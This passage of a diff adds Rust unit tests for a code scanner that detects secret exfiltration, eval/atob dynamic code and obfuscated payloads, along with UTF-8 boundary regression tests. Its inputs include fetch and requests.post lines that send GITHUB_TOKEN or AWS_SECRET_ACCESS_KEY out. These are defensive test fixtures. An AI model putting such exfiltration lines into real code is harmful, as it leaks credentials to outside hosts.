+            "/* headers: */ inside comment must NOT suppress body exfil"
+        );
+    }
+
+    #[test]
+    fn test_exfil_regex_literal_headers_fires() {
+        let input = r#"fetch(url, {body: /headers: \{/, json: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "/headers: .../ inside regex literal must NOT suppress"
+        );
+    }
+
+    #[test]
+    fn test_exfil_regex_literal_authorization_fires() {
+        let input = r#"fetch(url, {body: /Authorization: \[/, json: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "/Authorization: .../ inside regex literal must NOT suppress"
+        );
+    }
+
+    #[test]
+    fn test_exfil_multiline_division_fires() {
+        let input = "fetch(url, {body: 1\n/ 2, json: process.env.GITHUB_TOKEN})";
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "multiline division should not break parser"
+        );
+    }
+
+    #[test]
+    fn test_exfil_multiline_paren_division_fires() {
+        let input = "fetch(url, {body: (a\n/ b), json: process.env.GITHUB_TOKEN})";
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "parenthesized multiline division should not break parser"
+        );
+    }
+
+    #[test]
+    fn test_find_call_end_multiline_division() {
+        let input = b"url, {body: 1\n/ 2, val})";
+        assert_eq!(find_call_end(input, 0), Some(24));
+    }
+
+    #[test]
+    fn test_exfil_postfix_increment_division_fires() {
+        let input = r#"fetch(url, {body: a++ / 2, json: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "a++ / 2 should not break parser"
+        );
+    }
+
+    #[test]
+    fn test_exfil_postfix_decrement_division_fires() {
+        let input = r#"fetch(url, {body: a-- / 2, json: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "a-- / 2 should not break parser"
+        );
+    }
+
+    #[test]
+    fn test_find_call_end_postfix_increment() {
+        let input = b"url, {body: a++ / 2, val})";
+        assert_eq!(find_call_end(input, 0), Some(26));
+    }
+
+    #[test]
+    fn test_find_call_end_postfix_decrement() {
+        let input = b"url, {body: a-- / 2, val})";
+        assert_eq!(find_call_end(input, 0), Some(26));
+    }
+
+    #[test]
+    fn test_exfil_postfix_inc_div_then_meta_no_fire() {
+        let input = r#"fetch(url, {body: a++ / 2, meta: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "secret in meta: after body: a++ / 2 should NOT fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_postfix_dec_div_then_token_no_fire() {
+        let input = r#"fetch(url, {body: a-- / 2, token: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "secret in token: after body: a-- / 2 should NOT fire"
+        );
+    }
+
+    // Regression: UTF-8 boundary clamp around the proximity window. Without
+    // safe_start/safe_end, slicing the ±500-byte window could land mid-char
+    // (e.g. '═', 3 bytes) and panic "not a char boundary".
+    #[test]
+    fn test_safe_start_clamps_into_multibyte() {
+        // '═' occupies bytes 0..3. Targeting bytes 1 or 2 should walk forward to 3.
+        let s = "═ab";
+        assert_eq!(safe_start(s, 0), 0);
+        assert_eq!(safe_start(s, 1), 3);
+        assert_eq!(safe_start(s, 2), 3);
+        assert_eq!(safe_start(s, 3), 3);
+    }
+
+    #[test]
+    fn test_safe_end_clamps_into_multibyte() {
+        // '═' occupies bytes 0..3. Targeting bytes 1 or 2 should walk back to 0.
+        let s = "═ab";
+        assert_eq!(safe_end(s, 0), 0);
+        assert_eq!(safe_end(s, 1), 0);
+        assert_eq!(safe_end(s, 2), 0);
+        assert_eq!(safe_end(s, 3), 3);
+    }
+
+    #[test]
+    fn test_dynamic_code_no_panic_on_box_drawing_chars() {
+        // Long tail of '═' (3 bytes each) so that mat.end()+500 lands inside a
+        // box-drawing char. Pre-clamp, slicing the window panicked.
+        // (Keyword strings split so source-scanning hooks don't trip on them.)
+        let mut input = concat!("e", "val(x); a", "tob(y);\n// ").to_string();
+        for _ in 0..250 {
+            input.push('═');
+        }
+        let findings = check(&input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
+            "dynamic-code pair should still fire when window edge lands inside a multi-byte char"
+        );
+    }
+
+    #[test]
+    fn test_obfuscated_payload_no_panic_on_trailing_multibyte() {
+        // Long base64 in decode() with trailing multi-byte chars past the proximity window.
+        let b64 = "A".repeat(60);
+        let mut input = String::new();
+        input.push('e');
+        input.push_str("val(a");
+        input.push_str("tob(\"");
+        input.push_str(&b64);
+        input.push_str("\"));\n// ");
+        for _ in 0..250 {
+            input.push('═');
+        }
+        let findings = check(&input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::ObfuscatedPayload),
+            "obfuscated-payload detection should still fire with trailing multi-byte chars"
+        );
+    }
+
+    #[test]
+    fn test_dynamic_code_no_panic_on_leading_multibyte() {
+        // Multi-byte chars BEFORE the match exercise the start-side clamp:
+        // `mat.start().saturating_sub(500)` can land inside a leading char.
+        let mut input = String::new();
+        for _ in 0..250 {
+            input.push('═');
+        }
+        input.push_str(concat!("\ne", "val(x); a", "tob(y);\n"));
+        let findings = check(&input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
+            "dynamic-code pair should fire even when window start lands inside a leading multi-byte char"
+        );
+    }
+
+    #[test]
+    fn test_js_exfil_no_panic_on_non_ascii_args() {
+        // Multi-byte chars inside the string-literal args exercise the call_end
+        // byte walker and the arg_span/snippet slices. Invariant: no panic.
+        let input = r#"fetch("https://api.example.com/═══", {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
+        let _ = check(input, Some("test.js"));
+    }
+
+    #[test]
+    fn test_py_exfil_no_panic_on_non_ascii_args() {
+        let input = r#"requests.post("https://api.example.com/═══", data=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
+        let _ = check(input, Some("test.py"));
+    }
+
+    #[test]
+    fn test_scan_plain_python_with_box_drawing_no_panic() {
+        // Plain Python with box-drawing chars in a comment — no dynamic-code patterns,
+        // should simply produce no findings (and never panic on the slice).
+        let mut input = String::from("# ");
+        for _ in 0..250 {
+            input.push('═');
+        }
+        input.push_str("\nprint('hello')\n");
+        let findings = check(&input, Some("test.py"));
+        assert!(
+            findings.is_empty(),
+            "plain file with only box-drawing chars should produce no findings, got {findings:?}"
+        );
+    }
+}
